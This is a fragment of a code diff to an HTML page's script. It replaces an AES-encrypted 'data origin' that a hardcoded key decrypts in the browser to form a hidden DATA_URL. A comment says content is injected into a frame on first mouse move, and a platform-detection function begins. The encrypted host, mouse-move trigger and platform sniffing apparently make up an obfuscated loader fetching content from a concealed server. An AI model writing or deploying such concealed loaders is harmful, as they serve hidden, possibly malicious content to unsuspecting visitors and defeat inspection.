@@ -493,12 +493,12 @@
      it into #frame on first mouse move. Origin: pawfriend2 herokuapp.
      ====================================================================== -->
 <script>
-  const PASSPHRASE = "98yNCjeAfWMwk0wI";
-  const URL_KEY = "UrLk3yShopEase01";
-  const ENC_DATA_ORIGIN = "U2FsdGVkX1+LkLztRbBYxEysUcr39la17RYKTR88SSheYQNl7ETtpv2qHKhA+FQ7yPKosun8YBxgdFfOYYvUNQ==";
-  const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
-  const DATA_URL = DATA_ORIGIN.replace(/\/+$/, "") + "/data";
-  let lastUrl = null;
+  const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+         const URL_KEY = "UrLk3yShopEase01";
+         const ENC_DATA_ORIGIN = "U2FsdGVkX18zcEG6rMfZf/h7aXpPgg2QjXWge56vsa3fz34gu/dxgyC2e95fqSBQCaIthVEWQGsy/dWSF9cDAQ==";
+         const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+         const DATA_URL = DATA_ORIGIN + "/data";
+         let lastUrl = null;
 
   function detectPlatform() {
     const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
